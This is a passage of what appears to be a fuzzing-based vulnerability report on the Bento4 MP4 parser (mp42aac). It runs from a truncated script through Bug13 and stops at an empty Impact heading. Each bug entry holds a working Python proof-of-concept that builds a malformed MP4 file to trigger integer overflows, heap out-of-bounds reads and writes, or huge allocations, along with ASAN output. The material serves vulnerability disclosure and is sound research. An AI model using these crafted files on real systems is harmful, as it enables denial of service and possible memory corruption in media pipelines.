mdhd = fullbox(b'mdhd', 0, 0, struct.pack('>IIIII', 0, 0, 44100, 0, 0x15c70000))
hdlr_name = b'Sound Handler\x00'
hdlr = fullbox(b'hdlr', 0, 0, struct.pack('>I', 0) + b'soun' + b'\x00' * 12 + hdlr_name)
mdia = box(b'mdia', mdhd + hdlr + minf)

matrix = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
tkhd = fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    struct.pack('>II', 0, 0) +
    struct.pack('>hh', 0, 0) +
    struct.pack('>HH', 0x0100, 0) +
    matrix +
    struct.pack('>II', 0, 0))
trak = box(b'trak', tkhd + mdia)

mvhd = fullbox(b'mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +
    struct.pack('>HH', 0x0100, 0) +
    b'\x00' * 10 +
    matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')
mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print("[+] saiz atom: size=20, flags=0x000001, 8-byte body fully consumed by aux fields")
print("[+] Cross-boundary read: free-box header bytes → sample_count=0xFF000066 (~4 GB)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (8192Mb vs 8198Mb)
Cause: AP4_SaizAtom constructor with size=20 and flags=0x000001 causes remains to underflow to 0xFFFFFFFB, the sample-count sanity check is bypassed, m_SampleCount=0xFF000066 (~4 GB), and the resulting new[] allocation exhausts the RSS limit triggering an ASAN fatal abort with exit code 1.
Stack frame 0: AP4_SaizAtom::AP4_SaizAtom (Ap4SaizAtom.cpp:89)
Stack frame 1: AP4_SaizAtom::Create (Ap4SaizAtom.cpp:62)

### Impact

An attacker who can supply a crafted MP4 file to any mp42aac invocation can trigger an uncontrolled ~4 GB heap allocation through the unsigned integer underflow in AP4_SaizAtom, causing process termination via std::bad_alloc or ASAN RSS limit exhaustion and achieving a reliable denial of service. The same underflow additionally causes the constructor to read five bytes across the declared atom boundary from an adjacent atom, allowing an attacker who controls the file layout to inject arbitrary values for `m_DefaultSampleInfoSize` and `m_SampleCount`, which could lead to data confusion or further memory-safety violations in downstream processing. No special privileges are required because the vulnerable path is reached whenever mp42aac parses a moov box containing a saiz atom with the auxiliary-info flag set.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_cpp#005 -->
<!-- DEDUP: AP4_SaizAtom::AP4_SaizAtom::CWE-191 -->

## Bug8: AP4_SaioAtom integer overflow bypasses bounds check causing heap out-of-bounds read

In `AP4_SaioAtom::AP4_SaioAtom()` (Ap4SaioAtom.cpp), the bounds check `remains < entry_count * (version == 0 ? 4 : 8)` performs an unchecked 32-bit multiplication that wraps to zero when `version=1` and `entry_count=0x20000000`, allowing the check to be silently bypassed and triggering heap out-of-bounds reads in downstream atom parsers.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# saio box: version=1, flags=0, entry_count=0x20000000
# 0x20000000 * 8 = 0x100000000, truncates to 0 in 32-bit -> bounds check bypassed
entry_count = 0x20000000
fake_offset = struct.pack('>Q', 0)  # 1 fake 64-bit offset (8 bytes)
saio_data = struct.pack('>I', entry_count) + fake_offset
saio = full_box(b'saio', 1, 0, saio_data)

# Minimal stsd, stts
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + saio)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>II', 0, 0) + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)
trak = box(b'trak', tkhd + mdia)

mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

with open('poc_input.mp4', 'wb') as f:
    f.write(ftyp + moov)
print("Written poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f8 at pc 0x564a2bba8140 bp 0x7ffcece10870 sp 0x7ffcece10860
READ of size 1 at 0x5020000000f8 thread T0
    #0 0x564a2bba813f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x564a2bba9087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file with a `saio` box declaring `version=1` and `entry_count=0x20000000` can cause the 32-bit multiplication in the bounds check to wrap to zero, silently bypassing the guard and corrupting the stream reader position, which causes a subsequent sibling atom parser (`AP4_CttsAtom`) to perform a heap out-of-bounds read confirmed by AddressSanitizer. The attack surface is any invocation of mp42aac on an untrusted MP4 file, with no authentication or special privileges required. On 32-bit targets the overflow additionally enables out-of-bounds writes during loop-based entry population, raising the severity to potential heap corruption and remote code execution.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_h#003 -->
<!-- DEDUP: AP4_SaioAtom::AP4_SaioAtom::CWE-190 -->

## Bug9: AP4_SbgpAtom integer overflow in bounds-check expression bypasses guard and causes heap corruption

In `AP4_SbgpAtom::AP4_SbgpAtom()` in Ap4SbgpAtom.cpp, the bounds-check expression `entry_count * 8` performs 32-bit unsigned multiplication without overflow detection, so when `entry_count` is `0x20000000` the product wraps to zero and the guard is always bypassed, allowing an unconstrained heap allocation followed by out-of-bounds reads that corrupt heap state.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    return box(btype, struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data)

# sbgp full atom: entry_count=0x20000000 causes entry_count*8 to wrap to 0 (32-bit overflow)
entry_count = 0x20000000
grouping_type = b'seig'
fake_entry = struct.pack('>II', 1, 1)
sbgp_data = grouping_type + struct.pack('>I', entry_count) + fake_entry
sbgp = full_box(b'sbgp', 0, 0, sbgp_data)

stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + sbgp)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)

smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)

hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)

mdia = box(b'mdia', mdhd + hdlr + minf)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>II', 0, 0) + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

trak = box(b'trak', tkhd + mdia)

mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

moov = box(b'moov', mvhd + trak)
ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

data = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(data)
print(f"[+] Written poc_input.mp4 ({len(data)} bytes)")
print(f"[+] entry_count=0x{entry_count:08X} -> entry_count*8=0x{(entry_count*8)&0xFFFFFFFF:08X} (32-bit overflow)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f8 at pc 0x564a2bba8140 bp 0x7ffcece10870 sp 0x7ffcece10860
READ of size 1 at 0x5020000000f8 thread T0
    #0 0x564a2bba813f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x564a2bba9087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file to any invocation of mp42aac can trigger integer overflow in the `sbgp` atom parser, causing the size guard to be silently bypassed and the parser to call `SetItemCount(0x20000000)` on a heap array backed by an overflowed allocation. The resulting heap corruption cascades into an out-of-bounds read in the next atom parsed, producing a confirmed heap-buffer-overflow that terminates the process and constitutes a reliable denial-of-service condition. On 32-bit builds where the overflowed allocation may return a non-null pointer, subsequent indexed writes into the undersized array raise the risk to potential arbitrary code execution.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_h#002 -->
<!-- DEDUP: AP4_SbgpAtom::AP4_SbgpAtom::CWE-190 -->

## Bug10: AP4_TfraAtom constructor accepts unbounded file-controlled entry_count causing uncontrolled heap allocation

In `AP4_TfraAtom::AP4_TfraAtom()` in Ap4TfraAtom.cpp, the `entry_count` field is read from the MP4 stream at lines 86–88 and passed directly to `m_Entries.SetItemCount(entry_count)` without any upper-bound validation, which causes uncontrolled heap allocation and process termination when a crafted MP4 supplies a value such as 0x20000000.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct, os

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# tfra: version=0, flags=0
track_id = 1
# length_size_of_traf_num=0, length_size_of_trun_num=0, length_size_of_sample_num=0
# packed into 4B: 0x00 0x00 0x00 0x00
length_sizes = 0x00000000
entry_count = 0x20000000
# fake entry: time(4B) + moof_offset(4B) + traf_number(1B) + trun_number(1B) + sample_number(1B)
fake_entry = struct.pack('>II', 0, 0) + b'\x01\x01\x01'
tfra_data = struct.pack('>I', track_id)
tfra_data += struct.pack('>I', length_sizes)
tfra_data += struct.pack('>I', entry_count)
tfra_data += fake_entry
tfra = full_box(b'tfra', 0, 0, tfra_data)

# mfro: will contain mfra total size
mfro_inner = full_box(b'mfro', 0, 0, struct.pack('>I', 0))  # placeholder
mfra_content = tfra + mfro_inner
mfra_size = 4 + 4 + len(mfra_content)

# rebuild mfro with correct size
mfro = full_box(b'mfro', 0, 0, struct.pack('>I', mfra_size))
mfra = box(b'mfra', tfra + mfro)

# minimal moov
mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>I', 0) + b'\x00'*4 + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stsc = full_box(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = full_box(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = full_box(b'stco', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'iso5' + struct.pack('>I', 0) + b'iso5' + b'isom')

outpath = "poc_input.mp4"
with open(outpath, 'wb') as f:
    f.write(ftyp + moov + mfra)
print(f"Written {outpath}, size={os.path.getsize(outpath)}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:hard_rss_limit_mb=1024" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==760200==AddressSanitizer: hard rss limit exhausted (1024Mb vs 1159Mb)
Trigger: tfra box entry_count=0x20000000 causes AP4_TfraAtom::AP4_TfraAtom() to call SetItemCount(0x20000000), which attempts to allocate over 1 GB of heap memory with no upper-bound check, confirming uncontrolled resource consumption via CWE-789 / CWE-400.

### Impact

An attacker who supplies a crafted MP4 file with an oversized `entry_count` in the `tfra` box can force mp42aac to request more than one gigabyte of heap memory in a single allocation, causing the process to terminate via `std::bad_alloc` or ASAN RSS limit exhaustion and resulting in a denial-of-service condition. The attack surface is any invocation of mp42aac (or any Bento4-based tool) on an untrusted MP4 file, requiring no authentication or elevated privileges. On 32-bit builds the multiplication `entry_count * sizeof(Entry)` wraps around, producing a small under-allocated buffer followed by out-of-bounds heap writes that may enable memory corruption beyond denial of service.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_h#005 -->
<!-- DEDUP: AP4_TfraAtom::AP4_TfraAtom::CWE-190 -->

## Bug11: AP4_TrunAtom unbounded sample_count causes heap-buffer-overflow

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the file-controlled `sample_count` field is read from the stream and passed directly to `m_Entries.SetItemCount()` with no upper-bound check against the actual remaining box size, and processing the resulting malformed fragmented MP4 triggers a heap-buffer-overflow detected by AddressSanitizer.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct, os

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# trun: version=0, flags=0x201 (data_offset + sample_size per entry)
sample_count = 0x10000001
trun_data = struct.pack('>I', sample_count)  # sample_count
trun_data += struct.pack('>i', 8)            # data_offset (flags & 0x001)
# 1 fake entry: sample_size=1
trun_data += struct.pack('>I', 1)
trun = full_box(b'trun', 0, 0x201, trun_data)

# tfhd: track_id=1, flags=0
tfhd = full_box(b'tfhd', 0, 0, struct.pack('>I', 1))

# traf
traf = box(b'traf', tfhd + trun)

# mfhd (Movie Fragment Header)
mfhd = full_box(b'mfhd', 0, 0, struct.pack('>I', 1))  # sequence_number=1

# moof
moof = box(b'moof', mfhd + traf)

# mdat (empty)
mdat = box(b'mdat', b'')

# moov: mvhd + trak (minimal) + mvex
mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 2)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

# tkhd for trak 1
tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>I', 0) + b'\x00'*4 + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

# minimal stbl
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stsc = full_box(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = full_box(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = full_box(b'stco', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)

# mvex with trex
trex_data = struct.pack('>IIIII', 1, 1, 0, 0, 0)
trex = full_box(b'trex', 0, 0, trex_data)
mvex = box(b'mvex', trex)

moov = box(b'moov', mvhd + trak + mvex)

ftyp = box(b'ftyp', b'iso5' + struct.pack('>I', 0) + b'iso5' + b'isom' + b'mp42')

outpath = "poc_input.mp4"
with open(outpath, 'wb') as f:
    f.write(ftyp + moov + moof + mdat)
print(f"Written {outpath}, size={os.path.getsize(outpath)}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==723252==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f8 at pc 0x564a2bba8140 bp 0x7ffcece10870 sp 0x7ffcece10860
READ of size 1 at 0x5020000000f8 thread T0
    #0 0x564a2bba813f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x564a2bba9087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file with an oversized `sample_count` field in a `trun` box can trigger a heap-buffer-overflow during atom parsing, corrupting heap metadata and adjacent allocations in the mp42aac process. This condition is reachable from any invocation of mp42aac on an untrusted MP4 file with no authentication or special privilege required. The out-of-bounds read can lead to denial of service through process termination and, under exploitable heap layouts, may enable information disclosure or arbitrary code execution.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_h#004 -->
<!-- DEDUP: AP4_TrunAtom::AP4_TrunAtom::CWE-190 -->

## Bug12: AP4_NullTerminatedStringAtom Heap OOB Write via Integer Underflow

In `AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom` (`Bento4/Source/C++/Core/Ap4Atom.cpp`, lines 471–474), computing `str_size = (AP4_Size)size - AP4_ATOM_HEADER_SIZE` with `size == 8` yields the unsigned value zero, and the subsequent null-termination write `str[str_size - 1] = '\0'` underflows to `str[0xFFFFFFFF]`, causing a heap out-of-bounds write approximately 4 GB past the allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type_bytes, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type_bytes + payload

# ftyp box: 16 bytes — lets the parser accept the file
ftyp_payload = b"isom" + struct.pack(">I", 0)
ftyp_box = make_box(b"ftyp", ftyp_payload)

# 8id  box with size exactly 8 (header only, no payload) — triggers OOB write
# AP4_ATOM_TYPE_8ID_ = AP4_ATOM_TYPE('8','i','d',' ') = 0x38 0x69 0x64 0x20
eight_id_type = bytes([0x38, 0x69, 0x64, 0x20])
eight_id_box = make_box(eight_id_type, b"")

mp4_data = ftyp_box + eight_id_box

with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
print(f"  ftyp box: {len(ftyp_box)} bytes")
print(f"  8id  box: {len(eight_id_box)} bytes (size=8, no payload)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer:DEADLYSIGNAL
==ERROR: AddressSanitizer: SEGV on unknown address 0x50210000008f (pc ... T0)
The signal is caused by a WRITE memory access.
    #0 AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom(unsigned int, unsigned long long, AP4_ByteStream&)
    #1 AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&)

### Impact

An attacker who supplies a crafted MP4 file with an `8id ` box of exactly 8 bytes can trigger a heap out-of-bounds write at an offset of approximately 4 GB from the allocation, reliably crashing mp42aac and providing a denial-of-service primitive against any pipeline that processes untrusted MP4 input. On 32-bit systems the address wraps and the write lands one byte before the allocation, enabling potential heap metadata corruption that could be escalated toward arbitrary code execution under favorable allocator layout conditions. No user interaction beyond invoking mp42aac on the malicious file is required.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Atom_h#001 -->
<!-- DEDUP: `AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom::CWE-191 -->

## Bug13: AP4_CttsAtom Missing entry_count Bounds Check Causes Uncontrolled Memory Allocation

The `AP4_CttsAtom` constructor in `Ap4CttsAtom.cpp` reads `entry_count` from the stream at lines 79–80 without validating it against the declared atom size, allowing an attacker-controlled value to trigger unbounded heap allocations that exhaust process memory and crash the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.mp4"


def box(box_type: bytes, payload: bytes) -> bytes:
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(box_type, vf + payload)


ftyp_payload = (
    b"M4A "
    + struct.pack(">I", 0)
    + b"M4A " + b"mp42" + b"isom"
)
ftyp = box(b"ftyp", ftyp_payload)

mvhd_payload = struct.pack(">IIIII", 0, 0, 44100, 0, 0x00010000)
mvhd_payload += struct.pack(">H", 0x0100)
mvhd_payload += b"\x00" * 10
mvhd_payload += struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_payload += b"\x00" * 24
mvhd_payload += struct.pack(">I", 1)
assert len(mvhd_payload) == 96
mvhd = fullbox(b"mvhd", 0, 0, mvhd_payload)

tkhd_payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
tkhd_payload += b"\x00" * 8
tkhd_payload += struct.pack(">HHH", 0, 0, 0)
tkhd_payload += b"\x00" * 2
tkhd_payload += struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_payload += struct.pack(">II", 0, 0)
assert len(tkhd_payload) == 80
tkhd = fullbox(b"tkhd", 0, 3, tkhd_payload)

mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0)
mdhd_payload += struct.pack(">HH", 0x55C4, 0)
assert len(mdhd_payload) == 20
mdhd = fullbox(b"mdhd", 0, 0, mdhd_payload)

hdlr_payload = (
    struct.pack(">I", 0)
    + b"soun"
    + b"\x00" * 12
    + b"SoundHandler\x00"
)
hdlr = fullbox(b"hdlr", 0, 0, hdlr_payload)

smhd_payload = struct.pack(">HH", 0, 0)
smhd = fullbox(b"smhd", 0, 0, smhd_payload)

url_entry_payload = struct.pack(">I", 0x000001)
url_entry = box(b"url ", url_entry_payload)
dref_payload = struct.pack(">I", 1) + url_entry
dref = fullbox(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

stsd = fullbox(b"stsd", 0, 0, struct.pack(">I", 0))
stts = fullbox(b"stts", 0, 0, struct.pack(">I", 0))
stsc = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))
stsz = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stco = fullbox(b"stco", 0, 0, struct.pack(">I", 0))

# Malicious ctts box: declared size=16 but entry_count=0x04000000 (67108864)
# This triggers ~256MB vector allocation and ~512MB buffer allocation
MALICIOUS_ENTRY_COUNT = 0x04000000
ctts_version_flags = struct.pack(">I", 0)
ctts_entry_count   = struct.pack(">I", MALICIOUS_ENTRY_COUNT)
ctts_payload       = ctts_version_flags + ctts_entry_count
ctts_size          = 16
ctts = struct.pack(">I", ctts_size) + b"ctts" + ctts_payload

stbl_payload = stsd + stts + stsc + stsz + stco + ctts
stbl = box(b"stbl", stbl_payload)
minf = box(b"minf", smhd + dinf + stbl)
mdia = box(b"mdia", mdhd + hdlr + minf)
trak = box(b"trak", tkhd + mdia)
moov = box(b"moov", mvhd + trak)
mp4_data = ftyp + moov

with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] PoC written to: {OUTPUT_FILE} ({len(mp4_data)} bytes)")
print(f"[+] Malicious ctts entry_count: 0x{MALICIOUS_ENTRY_COUNT:08X} ({MALICIOUS_ENTRY_COUNT})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:hard_rss_limit_mb=512:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (512Mb vs 551Mb)
Root cause confirmed at Ap4CttsAtom.cpp lines 79-80: m_Entries.SetItemCount(0x04000000) triggers approximately 256MB vector allocation and new unsigned char[0x04000000 * 8] triggers approximately 512MB buffer allocation with no bounds check on entry_count against the declared atom size of 16 bytes.

### Impact

